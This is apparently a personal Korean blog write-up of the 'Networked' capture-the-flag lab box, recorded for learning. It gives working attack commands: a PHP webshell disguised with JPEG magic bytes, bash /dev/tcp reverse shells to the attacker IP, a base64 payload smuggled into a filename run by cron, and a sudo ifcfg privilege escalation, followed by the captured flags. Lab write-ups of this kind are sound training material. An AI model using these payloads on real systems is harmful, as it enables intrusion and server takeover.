---
slug: "networked"
title: "networked"
date: 2026-07-08
category: "리눅스"
tags: []
excerpt: "매직 바이트 + PHP 웹쉘 파일 생성 ```bash printf '\xff\xd8\xff' > exploit.php.jpg echo '<?php…"
readingTime: 6
---

# Box: Networked | Linux | Easy
날짜: 2026/06/19
소요시간: 6시간+

## Open Ports
- 22: TCP (SSH)
- 80: HTTP
- 443: HTTPS (closed)

## Interesting Services
- 22: SSH
- 80: HTTP → gobuster 때려볼거임
  - `/backup` → `backup.tar` 발견 → `tar -xvf backup.tar`
	  -> 여기서 나온 파일 이름들로 접속 다 가능
  - `/uploads` → 내용이 있진 않지만 뭔가를 올리는 곳으로 보임
    - `.jpg` `.png` `.gif` `.jpeg` 만 허용중
    - MIME 타입도 그렇게 허용 중인지 봐야함 → `image/` 만 받음
    - 매직 바이트 라는 개념이 있음
      - 파일 처음은 '헤더 시그니처', 파일 마지막은 '푸터 시그니처'
      - `hexdump -C -n 16 filename.ext` → `FF D8 FF` = JPEG 시그니처
    - hexeditor로 바꾸고 확장자를 `<이름>.txt.jpg`로 변경 → 파일 업로드 성공
    - 이제 업로드된 파일이 실행되는지 확인해야 함
    - 익스플로잇 코드를 작성해야함, 일단 PHP 파일로 remote cmdi 되는지 확인
    - 리버스쉘: 공격 대상(서버/PC)이 공격자의 컴퓨터로 먼저 연결(접속)을 시도하도록 만드는 해킹 기술
  - `/etc/passwd` 확인 후 `/home/guly` 가서 권한체크
  - `check_attack.php` 를 보면 upload 디렉토리에 있는 파일 이름에 IP가 잘못된 IP(`check_ip=false`)면 공격 들어온걸로 판단하고 이것저것 지우고 끄고 메일도 보냄 → exec을 이용할 방법을 찾아야함
  - `crontab.guly` 보면 3분에 한번씩 `check_attack.php`를 실행함 → 내가 실행을 안해도 된다는거지
  - `check_attack.php`는 특정 파일이름을 읽고 있음
    - 파일 이름을 `; bash -i >& /dev/tcp/10.10.15.242/4444 0>&1` 이렇게 하면 되지 않을까 싶음
    - 경로는 파일이름으로 들어갈 수 없으니까 base64로 인코딩

## Initial Foothold
벡터: File Upload Bypass + PHP Webshell + Reverse Shell

매직 바이트 + PHP 웹쉘 파일 생성
```bash
printf '\xff\xd8\xff' > exploit.php.jpg
echo '<?php system($_GET["cmd"]); ?>' >> exploit.php.jpg
```

업로드 후 실행 확인
```bash
http://<IP>/<파일경로+이름>?cmd=ls
```

공격자 리스너
```bash
nc -lvnp 4444
```

피해자 리버스쉘
```bash
bash -i >& /dev/tcp/10.10.15.242/4444 0>&1
```

URL 인코딩 버전
```bash
http://10.129.16.96/uploads/10_10_15_242.php.jpg?cmd=bash+-i+%3E%26+/dev/tcp/10.10.15.242/4444+0%3E%261
```

쉘 로그인 되는 유저 탐색
```bash
cat /etc/passwd | grep /bin/bash
```

## Privilege Escalation
벡터: Crontab + Command Injection via 파일명 → network-scripts ifcfg CentOS 공백 취약점

권한 확인
```bash
ls -al /home/guly
# -r-------- guly user.txt → cat 불가
```

base64 인코딩
```bash
echo -n 'bash -i >& /dev/tcp/10.10.15.242/4445 0>&1 ' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDIvNDQ0NSAwPiYxIA==
```

파일명에 페이로드 삽입
```bash
touch -- ';echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNDIvNDQ0NSAwPiYxIA==|base64 -d|bash'
```

공격자 리스너
```bash
nc -lvnp 4445

cat /home/guly/user.txt
#user flag : 4b425f83913eb85d0fe07ee41e731b22**
```
---
sudo 권한 확인
```bash
sudo -l
```

root 권한 획득 (ifcfg 공백 취약점)
```bash
cat changename.sh

#이런게 존재함 앞에 경로가 네트워크 인터페이스 설정파일 저장하는곳임
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF   
```

```bash
sudo /usr/local/sbin/changename.sh
# interface NAME: good /bin/bash 입력
# 나머지는 아무거나 입력
```

결과 확인
```bash
whoami        # root
cat ~/root.txt    # 19424a1fc687f829778b898c11c7daf8
```

## Rabbit Hole (막혔던 것)
- `>& /dev/tcp/...` URL에 직접 넣으면 특수문자 깨짐 → URL 인코딩 필요
- touch 파일명에 `!` 넣으면 zsh에서 오작동 → 작은따옴표 사용
- touch 파일명이 줄바꿈으로 두 줄로 나뉨 → `--` 옵션으로 해결

## 다음 박스에서 써먹을 것
- 파일 업로드 있으면 magic bytes + 이중 확장자 시도
- crontab + exec() 조합 보이면 파일명 인젝션 의심
- CentOS + network-scripts 보이면 ifcfg 공백 취약점 확인
- sudo -l 항상 먼저 확인
- touch `--` 옵션으로 특수문자 파일명 생성 가능